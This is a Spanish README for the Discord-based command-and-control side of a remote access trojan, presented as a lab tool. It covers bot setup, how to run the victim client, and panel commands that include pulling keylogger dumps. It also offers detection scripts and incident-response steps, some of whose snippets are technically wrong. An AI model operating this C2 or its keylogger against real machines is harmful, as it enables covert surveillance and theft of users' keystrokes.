# Centro de Comando C2 del Atacante

## Descripción

Este es el componente del centro de comando (C2) del RAT. Proporciona una interfaz de "Red Team" para controlar el payload de la víctima y analizar sistemas comprometidos.

## Advertencia Legal

```
⚠️ PANEL DE CONTROL DEL ATACANTE - C2 SECURITY LAB

USO PROHIBIDO:
✗ Ataques a sistemas sin autorización
✗ Robo de información personal o corporativa
✗ Interferencia con redes o servicios
✗ Distribución de malware o código malicioso

USO PERMITIDO:
✓ Entornos de prueba aislados (VMs sin internet)
✓ Simulación de respuesta a incidentes (DFIR)
✓ Competencias de seguridad (CTF)
✓ Entrenamiento defensivo en detección
✓ Investigación de técnicas de ciberataque

ESPECIALMENTE RELEVANTE PARA:
• Ingenieros de seguridad ofensiva
• Arquitectos de defensa cibernética
• Analistas de detección y respuesta
• Investigadores de amenazas
```

## Componentes

### Servidor C2 de Discord (`bot.py`)
- **Bot principal** de Discord para comunicación
- **Event handlers** para gestionar sesiones
- **Comandos del panel** para control
- **Logging de actividades** para análisis forense

Todo está integrado en `bot.py` (configuración, comandos y logging).

## Requisitos del Sistema

### Dependencias
```bash
pip install -r attacker/requirements.txt

Dependencias principales:
- discord.py: Cliente Discord para C2
- python-dotenv: Variables de entorno
```

### Requisitos del Sistema

- **Sistema Operativo:** Linux, Windows o macOS
- **Python:** 3.10 o superior
- **Red:** Conectividad a internet (para Discord)

## Instalación y Configuración

### 1. Prerrequisitos
```bash
# Crear entorno virtual (recomendado)
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows

# Instalar dependencias
pip install -r attacker/requirements.txt
```

### 2. Configurar Variables de Entorno
```bash
# Archivo attacker/.env
DISCORD_BOT_TOKEN="tu_token_del_bot_aqui"
COMMAND_CHANNEL_ID="id_del_canal_de_comandos_aqui"
```

### 3. Configurar Aplicación de Discord

#### Paso 1: Crear Aplicación
1. Visitar: https://discord.com/developers/applications
2. Hacer clic en "New Application"
3. Hacer clic en "Bot" en Build section

#### Paso 2: Configurar Bot
1. En Bot settings:
   - Activar: Presence Intent, Server Members Intent, Message Content Intent
   - Reset Token y copiar el token

2. En OAuth2:
   - URL de redirección: `https://discord.com/api/oauth2_redirect`
   - Permisos del bot: Administrator

#### Paso 3: Invitar Bot
```
https://discord.com/oauth2/authorize?client_id=TU_CLIENT_ID&scope=bot&permissions=PERMISSIONS
```

#### Paso 4: Configurar Variables de Entorno
```bash
export DISCORD_BOT_TOKEN="TU_TOKEN_DEL_BOT"
export COMMAND_CHANNEL_ID="ID_DEL_CANAL"
```

## Ejecución

### Terminal 1 - Centro de Comando (Atacante)
```bash
cd attacker
pip install -r attacker/requirements.txt
python bot.py
```

### Terminal 2 - Víctima (Máquina Comprometida)
```bash
cd victim
pip install -r victim/requirements.txt

# Ejecutar RAT
python client.py --token "TU_TOKEN_DEL_BOT" --channel "ID_DEL_CANAL"

# Para testing (usar solo en VMs autorizadas)
python client.py --token "TU_TOKEN_DEL_BOT" --channel "ID_DEL_CANAL" --allow-sandbox
```

## Comandos del Panel de Control

### Comandos Principales

| Comando | Uso | Descripción |
|---------|-----|-------------|
| `!sessions` | Ninguno | Lista todas las sesiones activas |
| `!victim <id>` | `<id>` | Ver detalle de una víctima |
| `!broadcast <mensaje>` | `<mensaje>` | Envía mensaje a todas las sesiones |
| `!keylog_dump` | Ninguno | Solicitar volcado del keylogger |
| `!notify on/off` | `on/off` | Activar/desactivar notificaciones |
| `!cleanup` | Ninguno | Limpia sesiones inactivas |
| `!info` | Ninguno | Muestra información del bot |
| `!help_c2` | Ninguno | Muestra ayuda del panel |

### Ejemplos de Uso

```bash
# Ver sesiones activas
!sessions

# Ver detalle de una víctima
!victim abc123

# Broadcast a todas las víctimas
!broadcast "⚠️ ALERTA: Ejercicio de seguridad activo"

# Solicitar keylog dump
!keylog_dump

# Activar notificaciones
!notify on

# Limpiar sesiones inactivas
!cleanup

# Información del bot
!info
```

## Monitoreo y Logs

### Logging de Actividades
El bot registra:

1. **Eventos de conexión**
   ```
   [2026-10-13 10:30:15] ATACANTE:BOT_INICIADO
   ```

2. **Sesiones de víctimas**
   ```
   [2026-10-13 11:45:22] ATACANTE:NUEVA_SESION abc123
   ```

3. **Comandos del atacante**
   ```
   [2026-10-13 12:00:45] ATACANTE:LISTAR_SESIONES 3 activas
   [2026-10-13 12:01:12] ATACANTE:BROADCAST Mensaje de prueba
   [2026-10-13 12:02:30] ATACANTE:KEYLOG_DUMP A 3 sesiones
   ```

## Análisis y Detección Defensiva

### Técnicas de Detección para Defender el C2

#### 1. Monitoreo de Red
```bash
# Detectar tráfico Discord saliente
sudo tcpdump -i any -w c2_traffic.pcap 'tcp port 443'

# Filtrar tráfico Discord
tcpdump -r c2_traffic.pcap 'host discord.com'
```

#### 2. Detección de Procesos
```powershell
# Buscar procesos sospechosos de bot Discord
Get-Process | Where-Object {
    $_.MainWindowTitle -like "*Discord*" -and
    $_.Description -like "*Security Bot*"
} | Select-Object ProcessName, Id, CPU, WorkingSet
```

#### 3. Auditoría de Permisos
```powershell
# Verificar permisos de archivos
Get-Acl -Path "C:\ruta\al\bot" | Format-List

# Revisar registry para actividades sospechosas
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
```

### Scripts de Detección

#### Script de Detección de C2
```python
# scripts/detect_c2.py
import socket
import subprocess
import psutil

def detectar_c2_discord():
    """Detecta actividad sospechosa de C2 vía Discord"""
    
    # 1. Monitorear conexiones salientes a Discord
    conexiones = []
    for conn in psutil.net_connections():
        if conn.status == 'ESTABLISHED' and conn.raddr:
            conexiones.append(conn)
    
    # 2. Buscar procesos sospechosos
    procesos_sospechosos = []
    for proc in psutil.process_iter(['pid', 'name', 'connections']):
        try:
            if 'discord' in proc.info['name'].lower():
                procesos_sospechosos.append(proc.info)
        except:
            pass
    
    return {
        'conexiones': conexiones,
        'procesos': procesos_sospechosos
    }
```

#### Script de Análisis Forense
```python
# scripts/forensic_analysis.py
import json
import subprocess
from datetime import datetime

def analizar_sistema_comprometido():
    """Analiza un sistema comprometido por el C2"""
    
    hallazgos = {
        'timestamp': datetime.now().isoformat(),
        'procesos_sospechosos': [],
        'archivos_sospechosos': [],
        'registros_modificados': [],
        'conexiones_sospechosas': []
    }
    
    # 1. Enumerar procesos
    try:
        ps = subprocess.run(['tasklist'], capture_output=True, text=True)
        for line in ps.stdout.split('\n'):
            if 'python' in line.lower() and 'update' in line.lower():
                hallazgos['procesos_sospechosos'].append(line)
    except:
        pass
    
    return hallazgos
```

## Guía de Respuesta a Incidentes

### Paso 1: Contención
```bash
# Aislar la máquina comprometida
sudo iptables -I INPUT -s 192.168.1.100 -j DROP

# Deshabilitar el bot Discord
sudo systemctl stop discord-bot
```

### Paso 2: Análisis
```bash
# Recopilar logs y evidencia
mv /var/log/discord-bot.log /evidence/
sudo tcpdump -r c2_traffic.pcap -w /evidence/captured_traffic.pcap
```

### Paso 3: Remediación
```powershell
# Eliminar toda persistencia
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "WindowsUpdateTask" -Confirm:$false
```

### Paso 4: Recuperación
```bash
# Restaurar controles de red
sudo iptables -D INPUT -s 192.168.1.100 -j DROP

# Reiniciar sistema (después de análisis completo)
sudo reboot
```

## Mejoras Técnicas

### 1. Seguridad del Bot
- **Almacenamiento seguro de tokens**
  ```python
  # En lugar de hardcode tokens, usar archivos cifrados
  import keyring
  token = keyring.get_password("discord_bot", "token")
  ```

- **Cifrado de tráfico**
  ```python
  # Implementar cifrado TLS fuerte
  import ssl
  context = ssl.create_default_context()
  ```

### 2. Detección Avanzada
- **Detección de firmas**
  ```python
  # Detectar comportamientos específicos del RAT
  if "WindowsUpdate" in registry_path:
      alert("Posible compromiso RAT")
  ```

- **Análisis de memoria**
  ```python
  # Detectar strings sospechosos en procesos
  strings = subprocess.run(['strings', pid], capture_output=True)
  ```

### 3. Autenticación del Panel
```python
# Agregar autenticación de dos factores
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
```

## Recursos de Apoyo

- [Documentación de Discord API](https://discord.com/developers/docs)
- [Python Discord.py](https://discordpy.readthedocs.io/)
- [Guía de Seguridad de Metasploit](https://docs.metasploit.com/)
- [Documentación de Respuesta a Incidentes SANS](https://www.sans.edu/courses/incident-response)

## Guía de Contribución

### Para Mejorar el Proyecto

1. **Reportar bugs**
   - Usar GitHub Issues con etiquetas: `bug`, `feature`, `documentation`
   - Incluir pasos de reproducción
   - Proporcionar información de sistema

2. **Contribuir código**
   - Crear fork del repositorio
   - Seguir convenciones de código (PEP 8)
   - Agregar tests para nuevas funciones
   - Crear pull request con descripción clara

3. **Documentar**
   - Actualizar README.md con nuevos comandos
   - Agregar ejemplos de uso
   - Documentar configuración de entorno

### Estándares de Calidad

- **Calidad de Código:** PEP 8, tipos anotados, docstrings
- **Pruebas:** >80% de cobertura, pruebas unitarias
- **Documentación:** README completo, comentarios
- **Seguridad:** Sin tokens hardcodeados, logging seguro

---

**⚠️ RECORDATORIO IMPORTANTE:**
*Este bot C2 debe usarse solo en sistemas con autorización explícita. Usar en sistemas sin autorización puede violar leyes y regulaciones.*

---

**"Herramientas de ataque entendidas, defensas construidas."** 💻🔐

---
